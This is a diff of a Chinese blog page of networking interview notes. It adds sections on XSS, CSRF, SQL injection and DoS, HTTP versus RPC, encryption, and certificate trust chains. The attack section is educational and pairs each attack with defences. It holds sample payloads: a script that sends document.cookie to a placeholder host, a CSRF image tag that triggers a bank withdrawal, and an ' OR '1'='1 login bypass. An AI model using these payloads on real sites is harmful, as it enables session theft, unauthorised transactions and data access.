@@ -1,7 +1,7 @@
 
 
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+<html lang="zh-CN" data-default-color-scheme=&quot;auto&quot;>
 
 
 
@@ -186,7 +186,7 @@ get将表单中的数据按照key=value的形式，添加到action指定的URL�
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      40.6k 字
+      42.3k 字
     </span>
   
 
@@ -196,7 +196,7 @@ get将表单中的数据按照key=value的形式，添加到action指定的URL�
       <i class="iconfont icon-clock-fill"></i>
       
       
-      438
+      457
        分钟
     </span>
   
@@ -238,7 +238,7 @@ get将表单中的数据按照key=value的形式，添加到action指定的URL�
             
               <p class="note note-info">
                 
-                  本文最后更新于：2020年12月11日 下午
+                  本文最后更新于：2022年1月16日 下午
                 
               </p>
             
@@ -1080,14 +1080,175 @@ get将表单中的数据按照key=value的形式，添加到action指定的URL�
 </ul>
 <figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">Last-Modified: Wed, <span class="hljs-number">21</span> Oct <span class="hljs-number">2015</span> <span class="hljs-number">07</span>:<span class="hljs-number">28</span>:<span class="hljs-number">00</span> GMT<br>If-Modified-Since: Wed, <span class="hljs-number">21</span> Oct <span class="hljs-number">2015</span> <span class="hljs-number">07</span>:<span class="hljs-number">28</span>:<span class="hljs-number">00</span> GMT<br></code></pre></div></td></tr></table></figure>
 
-<h1 id="19-HTTPS-流程"><a href="#19-HTTPS-流程" class="headerlink" title="19. HTTPS 流程"></a>19. HTTPS 流程</h1><p>首先是客户端（通常是浏览器）先向服务器发出加密通信的请求，请求包括了以下信息：</p>
+<h1 id="19-网络攻击手段有哪些？"><a href="#19-网络攻击手段有哪些？" class="headerlink" title="19. 网络攻击手段有哪些？"></a>19. 网络攻击手段有哪些？</h1><h2 id="跨站脚本攻击"><a href="#跨站脚本攻击" class="headerlink" title="跨站脚本攻击"></a>跨站脚本攻击</h2><p>跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。</p>
+<h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>例如有一个论坛网站，攻击者可以在上面发布以下内容：</p>
+<figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">location.href=<span class="hljs-string">"//domain.com/?c="</span> + <span class="hljs-built_in">document</span>.cookie</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></div></td></tr></table></figure>
+<p>之后该内容可能会被渲染成以下形式：</p>
+<figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">location.href=<span class="hljs-string">"//domain.com/?c="</span> + <span class="hljs-built_in">document</span>.cookie</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></div></td></tr></table></figure>
+<p>另一个用户浏览了含有这个内容的页面将会跳转到 <code>domain.com</code> 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。</p>
+<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul>
+<li>窃取用户的 Cookie</li>
+<li>伪造虚假的输入表单骗取个人信息</li>
+<li>显示伪造的文章或者图片</li>
+</ul>
+<h3 id="防范手段"><a href="#防范手段" class="headerlink" title="防范手段"></a>防范手段</h3><ol>
+<li>设置 Cookie 为 <code>HttpOnly</code>: 设置了 <code>HttpOnly</code> 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 <code>document.cookie</code> 获取用户 Cookie 信息。</li>
+<li>过滤特殊字符: 例如将 <code>&lt;</code> 转义为 <code>&amp;lt;</code>，将 <code>&gt;</code> 转义为 <code>&amp;gt;</code>，从而避免 HTML 和 Jascript 代码的运行。</li>
+</ol>
+<p>富文本编辑器允许用户输入 HTML 代码，就不能简单地将 <code>&lt;</code> 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。</p>
+<p>富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。</p>
+<p>以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。</p>
+<figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"title"</span>&gt;</span>XSS Demo<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"q"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"test"</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/javascript"</span>&gt;</span><span class="javascript"><br>alert(<span class="hljs-regexp">/xss/</span>);<br></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></div></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>XSS Demo<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br>&amp;lt;form&amp;gt;<br>  &amp;lt;input type="text" name="q" value="test"&amp;gt;<br>&amp;lt;/form&amp;gt;<br><br><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span><br><br>&amp;lt;script type="text/javascript"&amp;gt;<br>alert(/xss/);<br>&amp;lt;/script&amp;gt;<br></code></pre></div></td></tr></table></figure>
+<h2 id="跨站请求伪造"><a href="#跨站请求伪造" class="headerlink" title="跨站请求伪造"></a>跨站请求伪造</h2><p>跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。</p>
+<p>XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。</p>
+<h3 id="攻击原理-1"><a href="#攻击原理-1" class="headerlink" title="攻击原理:"></a>攻击原理:</h3><p>假如一家银行用以执行转账操作的 URL 地址如下： <code>http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName</code>。<br>那么，一个恶意攻击者可以在另一个网站上放置如下代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman"</span>&gt;</span><br></code></pre></div></td></tr></table></figure>
+<p>如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。</p>
+<p>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p>
+<p>通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p>
+<h3 id="防范手段-1"><a href="#防范手段-1" class="headerlink" title="防范手段"></a>防范手段</h3><h4 id="1-检查-Referer-首部字段"><a href="#1-检查-Referer-首部字段" class="headerlink" title="1. 检查 Referer 首部字段"></a>1. 检查 Referer 首部字段</h4><p>Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。</p>
+<p>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。</p>
+<h4 id="2-添加校验-Token"><a href="#2-添加校验-Token" class="headerlink" title="2. 添加校验 Token"></a>2. 添加校验 Token</h4><p>在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。</p>
+<h4 id="3-输入验证码"><a href="#3-输入验证码" class="headerlink" title="3. 输入验证码"></a>3. 输入验证码</h4><p>因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。</p>
+<h2 id="SQL-注入攻击"><a href="#SQL-注入攻击" class="headerlink" title="SQL 注入攻击"></a>SQL 注入攻击</h2><p>服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。</p>
+<h3 id="攻击原理-2"><a href="#攻击原理-2" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>例如一个网站登录验证的 SQL 查询代码为：</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">strSQL = <span class="hljs-string">"SELECT * FROM users WHERE (name = '"</span> + userName + <span class="hljs-string">"') and (pw = '"</span>+ passWord +<span class="hljs-string">"');"</span><br></code></pre></div></td></tr></table></figure>
+<p>如果填入以下内容：</p>
+<figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">userName</span> = <span class="hljs-string">"1' OR '1'='1"</span><span class="hljs-comment">;</span><br><span class="hljs-attr">passWord</span> = <span class="hljs-string">"1' OR '1'='1"</span><span class="hljs-comment">;</span><br></code></pre></div></td></tr></table></figure>
+<p>那么 SQL 查询字符串为：</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">strSQL = <span class="hljs-string">"SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"</span><br></code></pre></div></td></tr></table></figure>
+<p>此时无需验证通过就能执行以下查询：</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">strSQL = <span class="hljs-string">"SELECT * FROM users;"</span><br></code></pre></div></td></tr></table></figure>
+
+<h3 id="防范手段-2"><a href="#防范手段-2" class="headerlink" title="防范手段"></a>防范手段</h3><h4 id="1-使用参数化查询"><a href="#1-使用参数化查询" class="headerlink" title="1. 使用参数化查询"></a>1. 使用参数化查询</h4><p>Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">PreparedStatement stmt = connection.prepareStatement(<span class="hljs-string">"SELECT * FROM users WHERE userid=? AND password=?"</span>);<br>stmt.setString(<span class="hljs-number">1</span>, userid);<br>stmt.setString(<span class="hljs-number">2</span>, password);<br>ResultSet rs = stmt.executeQuery();<br></code></pre></div></td></tr></table></figure>
+<h4 id="2-单引号转换"><a href="#2-单引号转换" class="headerlink" title="2. 单引号转换"></a>2. 单引号转换</h4><p>将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。</p>
+<h2 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h2><p>拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p>
+<p>分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。</p>
+<h1 id="20-HTTP和RPC区别？（服务之间的调用为啥不直接用-HTTP-而用-RPC？）"><a href="#20-HTTP和RPC区别？（服务之间的调用为啥不直接用-HTTP-而用-RPC？）" class="headerlink" title="20. HTTP和RPC区别？（服务之间的调用为啥不直接用 HTTP 而用 RPC？）"></a>20. HTTP和RPC区别？（服务之间的调用为啥不直接用 HTTP 而用 RPC？）</h1><p>RPC（Remote Procedure Call）—远程过程调用，它是一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的协议。比如两个不同的服务 A、B 部署在两台不同的机器上，那么服务 A 如果想要调用服务 B 中的某个方法该怎么办呢？使用 HTTP请求当然可以，但是可能会比较慢而且一些优化做的并不好。 RPC 的出现就是为了解决这个问题。</p>
+<p><strong>RPC 原理</strong>：</p>
+<p><img src="https://qiniu.xiaoming.net.cn/RPC%E5%8E%9F%E7%90%86.jpeg" alt="RPC原理"></p>
+<ol>
+<li>服务消费方（client）调用以本地调用方式调用服务；</li>
+<li>client stub接收到调用后负责将方法、参数等组装成能够进行网络传输的消息体；</li>
+<li>client stub找到服务地址，并将消息发送到服务端；</li>
+<li>server stub收到消息后进行解码；</li>
+<li>server stub根据解码结果调用本地的服务；</li>
+<li>本地服务执行并将结果返回给server stub；</li>
+<li>server stub将返回结果打包成消息并发送至消费方；</li>
+<li>client stub接收到消息，并进行解码；</li>
+<li>服务消费方得到最终结果。</li>
+</ol>
+<p><img src="https://qiniu.xiaoming.net.cn/RPC%E6%97%B6%E5%BA%8F%E5%9B%BE.jpeg" alt="RPC时序图"></p>
+<p>RPC主要解决的问题：<strong>让分布式或者微服务系统中不同服务之间的调用像本地调用一样简单。</strong></p>
+<p>RPC 只是一种概念、一种设计，就是为了解决不同服务之间的调用问题,它一般会包含有<strong>传输协议</strong>和<strong>序列化协议</strong>这两个。</p>
+<p>实现 RPC 的传输协议可以直接建立在 TCP 之上，也可以建立在 HTTP 协议之上。大部分 RPC 框架都是使用的 TCP 连接（gRPC使用了HTTP2）。</p>
+<blockquote>
+<p>通常谈计算机网络的五层协议的体系结构是指：应用层、传输层、网络层、数据链路层、物理层。<br><strong>应用层(application-layer）的任务是通过应用进程间的交互来完成特定网络应用</strong>。HTTP 属于应用层协议，它会基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。HTTP协议工作于客户端-服务端架构为上。浏览器作为HTTP客户端通过 URL 向HTTP服务端即 WEB 服务器发送所有请求。Web 服务器根据接收到的请求后，向客户端发送响应信息。HTTP协议建立在 TCP 协议之上。<br>运输层(transport layer)的主要任务就是负责向两台主机进程之间的通信提供通用的数据传输服务。TCP是传输层协议，主要解决数据如何在网络中传输。相比于UDP,TCP 提供的是面向连接的，可靠的数据传输服务。</p>
+</blockquote>
+<p>RPC 和 HTTP 主要关键区别就在 <strong>HTTP 使用的 TCP 协议，和 RPC 自定义的 TCP 协议在报文上的区别</strong>。</p>
+<p>http1.1协议的 TCP 报文包含太多在传输过程中可能无用的信息：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">HTTP/<span class="hljs-number">1.0</span> <span class="hljs-number">200</span> OK <br>Content-Type: text/plain<br>Content-Length: <span class="hljs-number">137582</span><br>Expires: Thu, <span class="hljs-number">05</span> Dec <span class="hljs-number">1997</span> <span class="hljs-number">16</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> GMT<br>Last-Modified: Wed, <span class="hljs-number">5</span> August <span class="hljs-number">1996</span> <span class="hljs-number">15</span>:<span class="hljs-number">55</span>:<span class="hljs-number">28</span> GMT<br>Server: Apache <span class="hljs-number">0.84</span><br><br>&lt;html&gt;<br>  &lt;body&gt;Hello World&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></div></td></tr></table></figure>
+<p>使用自定义 TCP 协议进行传输就会避免上面这个问题，极大地减轻了传输数据的开销。 这也就是为什么通常会采用自定义 TCP 协议的 RPC 来进行进行服务调用的真正原因。除此之外，成熟的 RPC 框架还提供好了“服务自动注册与发现”、“智能负载均衡”、“可视化的服务治理和运维”、“运行期流量调度”等等功能，这些也算是选择 RPC 进行服务注册和发现的一方面原因。</p>
+<h1 id="21-对称加密与非对称加密"><a href="#21-对称加密与非对称加密" class="headerlink" title="21. 对称加密与非对称加密"></a>21. 对称加密与非对称加密</h1><h2 id="对称加密和非对称加密"><a href="#对称加密和非对称加密" class="headerlink" title="对称加密和非对称加密"></a>对称加密和非对称加密</h2><p><strong>对称加密</strong>：A与 B 之间之间的通讯数据都用同一套的密钥来进行加密解密。</p>
+<p>优点：</p>
+<ul>
+<li>简单快捷，密钥较短，且破译困难。</li>
+</ul>
+<p>缺点：</p>
+<ul>
+<li>如果用户一旦多的话，管理密钥也是一种困难。不方便直接沟通的两个用户之间怎么确定密钥也需要考虑，这其中就会有密钥泄露的风险，以及存在更换密钥的需求。</li>
+</ul>
+<p>对称加密通常有 DES,IDEA,3DES 加密算法。</p>
+<p><strong>非对称加密</strong>：用公钥和私钥来加解密的算法。打个比方，A 的公钥加密过的东西只能通过 A 的私钥来解密；同理，A 的私钥加密过的东西只能通过 A 的公钥来解密。顾名思义，公钥是公开的，别人可以获取的到；私钥是私有的，只能自己拥有。</p>
+<p>缺点：</p>
+<ul>
+<li>加解密比对称加密耗时.</li>
+</ul>
+<p>优点：</p>
+<ul>
+<li>比对称加密安全.</li>
+</ul>
+<p>但是非对称加密也是存在漏洞，因为公钥是公开的，如果有 C 冒充 B 的身份利用 A 的公钥给 A 发消息，这样就乱套了，所以接下来就采用<strong>非对称加密+摘要算法+数字签名</strong>的机制来确保传输安全。</p>
+<p>常见的非对称加密算法有：RSA、ECC（移动设备用）、Diffie-Hellman、El Gamal、DSA（数字签名用）</p>
+<h2 id="Hash算法（摘要算法）"><a href="#Hash算法（摘要算法）" class="headerlink" title="Hash算法（摘要算法）"></a>Hash算法（摘要算法）</h2><p>Hash 算法的特点是单向不可还原，用户可以通过 hash 算法对目标信息生成一段特定长度的唯一 hash 值，却不能通过这个 hash 值重新获得目标信息。因此 Hash 算法常用在不可还原的密码存储、信息完整性校验等。只要源数据不同，算法得到的摘要必定不同。</p>
+<p>常见的 Hash 算法有 MD2、MD4、MD5、HAVAL、SHA</p>
+<h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><p>数字签名用来，保证信息传输的完整性、发送者的身份认证、防止交易中的抵赖发生。<br>数字签名是 A 将原始明文通过 hash 算法得到摘要，这个摘要是不可逆的；将明文加密，连同摘要加密后一起发送给 B；B 接收到后解密，得到这个摘要 a 和加密的明文，再将加密明文解密得到原始明文，然后通过同一 hash 算法得到新的摘要 b，比较 a 与 b 就可得知在传输过程中是否被更改过。</p>
+<p>因此数字签名能够验证信息的完整性。如果中途数据被纂改或者丢失。那么对方就可以根据数字签名来辨别是否是来自对方的第一手信息数据。</p>
+<h2 id="完整的非对称加密过程"><a href="#完整的非对称加密过程" class="headerlink" title="完整的非对称加密过程"></a>完整的非对称加密过程</h2><p>假如现在你向支付宝转账（术语数据信息），为了保证信息传送的保密性、真实性、完整性和不可否认性，需要对传送的信息进行数字加密和签名，其传送过程为：</p>
+<ol>
+<li>首先你要确认是否是支付宝的数字证书，如果确认为支付宝身份后，则对方真实可信。可以向对方传送信息，</li>
+<li>你准备好要传送的数字信息（明文）计算要转的多少钱，对方支付宝账号等；</li>
+<li>你对数字信息进行哈希运算，得到一个信息摘要（客户端主要职责）；</li>
+<li>你用自己的私钥对信息摘要进行加密得到你的数字签名，并将其附在数字信息上；</li>
+<li>你随机产生一个加密密钥，并用此密码对要发送的信息进行加密（密文）；</li>
+<li>你用支付宝的公钥对刚才随机产生的加密密钥进行加密，将加密后的 DES 密钥连同密文一起传送给支付宝；</li>
+<li>支付宝收到你传送来的密文和加密过的 DES 密钥，先用自己的私钥对加密的 DES 密钥进行解密，得到你随机产生的加密密钥；</li>
+<li>支付宝然后用随机密钥对收到的密文进行解密，得到明文的数字信息，然后将随机密钥抛弃；</li>
+<li>支付宝用你的公钥对你的的数字签名进行解密，得到信息摘要；</li>
+<li>支付宝用相同的哈希算法对收到的明文再进行一次哈希运算，得到一个新的信息摘要；</li>
+<li>支付宝将收到的信息摘要和新产生的信息摘要进行比较，如果一致，说明收到的信息没有被修改过。</li>
+<li>确定收到信息，然后进行向对方进行付款交易，一次非对称密过程结束。在这后面的流程就不属于本次非对称加密的范畴，算支付宝个人的自我流程，也就是循环以上过程。</li>
+</ol>
+<h1 id="22-公密钥与证书的关系"><a href="#22-公密钥与证书的关系" class="headerlink" title="22. 公密钥与证书的关系"></a>22. 公密钥与证书的关系</h1><h2 id="使用例子"><a href="#使用例子" class="headerlink" title="使用例子"></a>使用例子</h2><p>假设现在小 A 有两把钥匙，一把是公钥，另一把是私钥。</p>
+<p>小 A 把公钥送给他的朋友：小B、小C、小D，每人一把。</p>
+<p>现在小 B 要给小 A 写一封保密的信。他写完后用鲍勃的公钥加密，就可以达到保密的效果。</p>
+<p>收信后，小 A 用私钥解密，就看到了信件内容。这里要强调的是，只要小 A 的私钥不泄露，这封信就是安全的，即使落在别人手里，也无法解密。</p>
+<p>小 A 给小 B 回信，决定采用”数字签名”。他写完后先用 Hash 函数，生成信件的摘要（digest）。然后，小 A 使用私钥，对这个摘要加密，生成”数字签名”（signature）。</p>
+<p>之后小 A 将这个签名，附在信件下面，一起发给小 B。</p>
+<p>小 B 收信后，取下数字签名，用小 A 的公钥解密，得到信件的摘要。由此证明，这封信确实是小 A 发出的。</p>
+<p>小 B 再对信件本身使用 Hash 函数，将得到的结果，与上一步得到的摘要进行对比。如果两者一致，就证明这封信未被修改过。</p>
+<p>这时候出现了如下的情况：小 C 想欺骗小 B，他偷偷使用了小 B 的电脑，用自己的公钥换走了小 A 的公钥。此时，小 B 实际拥有的是小 C 的公钥，但是还以为这是小 A 的公钥。因此，小 C 就可以冒充小 A，用自己的私钥做成”数字签名”，写信给小 B，让小 B 用假的小 A 公钥进行解密。</p>
+<p>后来，小 B 感觉不对劲，发现自己无法确定公钥是否真的属于小 A。他想到了一个办法，要求小 A 去找”证书中心”（certificate authority，简称CA），为公钥做认证。证书中心用自己的私钥，对小 A 的公钥和一些相关信息一起加密，生成<strong>“数字证书”</strong>（Digital Certificate）。</p>
+<p>小 A 拿到数字证书以后，就可以放心了。以后再给小 B 写信，只要在签名的同时，再附上数字证书就行了。</p>
+<p>小 B 收信后，用 CA 的公钥解开数字证书，就可以拿到小 A 真实的公钥了，然后就能证明”数字签名”是否真的是小 A 签的。</p>
+<p>也就是说，<strong>证书是用来证明公钥拥有者身份的凭证</strong>。</p>
+<h2 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h2><p>数字证书一般由数字证书认证机构签发，需要</p>
+<ul>
+<li>申请者通过<strong>非对称加密算法（RSA）</strong> 生成一对<strong>公钥</strong>和<strong>密钥</strong>，然后把需要的申请信息（国家，域名等）连同公钥发送给<strong>证书认证机构（CA）</strong></li>
+<li>CA 构确认无误后通过<strong>消息摘要算法</strong>（MD5，SHA) 生成整个申请信息的摘要签名 M， 然后把<strong>签名 M 和使用的摘要算法</strong>用 <strong>CA 自己的私钥</strong>进行加密</li>
+</ul>
+<p>证书包含了</p>
+<ul>
+<li>公钥</li>
+<li>证书拥有者身份信息</li>
+<li>数字证书认证机构（发行者）信息</li>
+<li>发行者对这份文件的数字签名及使用的算法</li>
+<li>有效期</li>
+</ul>
+<p>证书的格式和验证方法普遍遵循 <a href="https://www.wikiwand.com/zh-hans/X.509" target="_blank" rel="noopener">X.509</a> 国际标准。</p>
+<h2 id="证书认证机构（CA）"><a href="#证书认证机构（CA）" class="headerlink" title="证书认证机构（CA）"></a>证书认证机构（CA）</h2><blockquote>
+<p>数字证书认证机构（英语：Certificate Authority，缩写为CA），也称为电子商务认证中心、电子商务认证授权机构，是负责发放和管理数字证书的权威机构，并作为电子商务交易中受信任的第三方，承担公钥体系中公钥的合法性检验的责任。</p>
+</blockquote>
+<p>其实任何个体/组织都可以成为CA（自签证书），但是你发布的证书客户端是不信任的，也是就前文提及的需要权威。比如 <strong>Symantec、Comodo、Godaddy、Digicert</strong>。</p>
+<p>客户端信任这些 CA，就会在其本地保持这些 CA 的 <strong>根证书</strong>（<strong>root certificate</strong>），<strong>根证书是 CA 自己的证书</strong>，是证书验证链的开头。根证书没有机构（已经是权威了）再为其做数字签名，所以都是自签证书。</p>
+<p>有些 CA 会通过<strong>中介证书（intermediate-certificate）</strong>替代根证书的去做服务器端的证书签名，确保根证书密钥绝对不可访问。</p>
+<p>Godaddy 给出了解释：</p>
+<blockquote>
+<p>中级证书相当于是我们的根证书的替身。我们之所以使用中级证书，是因为我们必须在根证书上建立许多安全层，从而确保根证书的密钥绝对不会被任何人访问。</p>
+<p>不过，由于根证书自身签署了中级证书，因此中级证书就可以用于签署我们的客户安装的 SSL 并维持“信任链”。</p>
+<p>安装中级证书<br>当您的 SSL 证书获得颁发后，您会收到一封包含链接的电子邮件，通过该链接可以下载经过签名的证书和我们的中级证书。</p>
+</blockquote>
+<h3 id="证书信任链"><a href="#证书信任链" class="headerlink" title="证书信任链"></a>证书信任链</h3><p>上面说过，在向CA 申请证书时是需要 <strong>CA 的私钥</strong>去对整个证书的签名摘要做非对称加密的，也就是证书是可以通过 <strong>CA 的公钥</strong> 去解密得到<strong>证书的签名摘要</strong>的。</p>
+<p>当我们再次用<strong>相同的摘要算法</strong>（证书里面有保存所使用的算法）对整个证书做签名，如果得到的签名和证书上的签名是一致的，说明这个证书是可信任的。</p>
+<p>同理，中介证书也是可以被这样的方式证明其可信任。这样的一整个流程称为 <strong>信任链</strong>（Chain of trust）。</p>
+<p>就是我<strong>绝对</strong>相信你（A&gt;B）；你<strong>绝对</strong>相信他（B&gt;C）；等于我<strong>绝对</strong>相信他（A&gt;C）</p>
+<p>以下是整个流程：</p>
+<ol>
+<li>客户端得到服务端返回的证书，通过读取得到 <strong>服务端证书的发布机构（Issuer）</strong></li>
+<li>客户端去操作系统查找这个发布机构的的证书，如果是不是根证书就继续递归下去 <strong>直到拿到根证书</strong>。</li>
+<li>用 <strong>根证书的公钥</strong> 去 <strong>解密验证</strong> 上一层证书的<strong>合法性</strong>，再拿上一层证书的公钥去验证更上层证书的合法性；递归回溯。</li>
+<li>最后验证服务器端的证书是 <strong>可信任</strong> 的。</li>
+</ol>
+<h1 id="23-HTTPS-流程"><a href="#23-HTTPS-流程" class="headerlink" title="23. HTTPS 流程"></a>23. HTTPS 流程</h1><p>首先是客户端（通常是浏览器）先向服务器发出加密通信的请求，请求包括了以下信息：</p>
 <ul>
